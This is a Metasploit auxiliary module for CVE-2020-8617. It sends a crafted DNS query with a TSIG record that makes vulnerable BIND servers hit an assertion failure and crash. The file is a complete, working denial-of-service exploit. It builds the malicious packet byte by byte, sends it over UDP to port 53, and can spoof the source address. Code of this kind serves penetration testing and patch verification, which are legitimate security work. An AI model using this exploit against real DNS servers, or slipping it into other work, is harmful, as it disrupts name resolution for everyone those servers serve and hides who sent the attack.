##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Capture
  include Msf::Auxiliary::UDPScanner
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'BIND TSIG Badtime Query Denial of Service',
        'Description' => %q{
          A logic error in code which checks TSIG validity can be used to
          trigger an assertion failure in tsig.c.
        },
        'Author' => [
          'Tobias Klein',  # Research and Original PoC
          'Shuto Imai',    # msf module author
        ],
        'References' => [
          ['CVE', '2020-8617'],
          ['URL', 'https://gitlab.isc.org/isc-projects/bind9/-/issues/1703'],
          ['URL', 'https://www.trapkit.de/advisories/TKADV2020-002.txt']
        ],
        'DisclosureDate' => '2020-05-19',
        'License' => MSF_LICENSE,
        'DefaultOptions' => { 'ScannerRecvWindow' => 0 }
      )
    )

    register_options([
      Opt::RPORT(53),
      OptAddress.new('SRC_ADDR', [false, 'Source address to spoof']),
    ])

    deregister_options('PCAPFILE', 'FILTER', 'SNAPLEN', 'TIMEOUT')
  end

  def scan_host(ip)
    print_status("Sending packet to #{ip}")
    if datastore['SRC_ADDR']
      scanner_spoof_send(payload, ip, rport, datastore['SRC_ADDR'])
    else
      scanner_send(payload, ip, rport)
    end
  end

  def payload
    query = Rex::Text.rand_text_alphanumeric(2) # Transaction ID: 0x8f65
    query << "\x00\x00"  # Flags: 0x0000 Standard query
    query << "\x00\x01"  # Questions: 1
    query << "\x00\x00"  # Answer RRs: 0
    query << "\x00\x00"  # Authority RRs: 0
    query << "\x00\x01"  # Additional RRs: 1

    # Domain Name
    query << get_domain # Random DNS Name
    query << "\x00"      # [End of name]
    query << "\x00\x01"  # Type: A (Host Address) (1)
    query << "\x00\x01"  # Class: IN (0x0001)

    # Additional records. Name
    query << "\x0alocal-ddns"
    query << "\x00"

    query << "\x00\xfa" # Type: TSIG (Transaction Signature) (250)
    query << "\x00\xff" # Class: ANY (0x00ff)
    query << "\x00\x00\x00\x00" # Time to live: 0
    query << "\x00\x1d" # Data length: 29

    # Algorithm Name
    query << "\x0bhmac-sha256" # The algorithm for local-ddns is hmac-sha256
    query << "\x00"

    # Rest of TSIG
    query << "\x00\x00\x00\x00\x00\x00" # Time Signed: Jan  1, 1970 00:00:00.000000000 UTC
    query << "\x00\x00" # Fudge: 0
    query << "\x00\x00" # MAC Size: 0
    query << "\x00\x00" # Original Id: 0
    query << "\x00\x10" # Error: BadSig (16)
    query << "\x00\x00" # Other len: 0
  end

  def get_domain
    domain = "\x06#{Rex::Text.rand_text_alphanumeric(6)}"
    org = "\x03#{Rex::Text.rand_text_alphanumeric(3)}"
    domain + org
  end

end
